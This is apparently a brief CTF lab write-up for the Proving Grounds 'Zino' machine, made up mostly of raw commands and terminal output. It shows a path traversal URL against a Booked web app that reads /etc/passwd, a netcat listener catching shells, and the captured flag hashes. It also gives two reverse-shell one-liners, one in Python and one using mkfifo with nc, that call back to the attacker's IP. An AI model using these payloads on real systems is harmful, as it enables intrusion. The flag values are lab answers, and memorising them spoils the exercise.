参考资料
https://github.com/pika5164/Offsec_Proving_Grounds/blob/master/PG_Practice/Linux/Zino.md

```
http://192.168.128.64:8003/booked/Web/admin/manage_email_templates.php?dr=template&lang=en_us&tn=%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&_=1588451710324  
```


```
                                                                                    
┌──(kali㉿kali)-[~/Desktop/pg3/Zino]
└─$ rlwrap -cAr nc -nvlp445
listening on [any] 445 ...
connect to [192.168.45.221] from (UNKNOWN) [192.168.128.64] 53566
$ whoami 
whoami 
www-data
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@zino:/var/www/html/booked/Web$ 

www-data@zino:/var/www/html/booked/Web$ cd /home
cd /homels

www-data@zino:/home$ ls
peter
www-data@zino:/home$ cd peter 
cd peter 
www-data@zino:/home/peter$ ls
ls
access.log  auth.log  error.log  ftp  local.txt  misc.log
www-data@zino:/home/peter$ cat local.txt
cat local.txt
faef938b7bd6b32ae76afbc5adc02482
www-data@zino:/home/peter$ 


connect to [192.168.45.221] from (UNKNOWN) [192.168.128.64] 49272
/bin/sh: 0: can't access tty; job control turned off
# # # # # # # # # # # proof.txt
# # # # # # # # # # # # # # proof.txt
# 
# la
/bin/sh: 27: la: not found
# ls
proof.txt
# cat proof.txt
7c3ccb9b1f467150ababf5ef0e9d3317
# 



python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.221",445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'




os.system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.221 8003 >/tmp/f')


```



截图
![[Pasted image 20260814063917.png]]
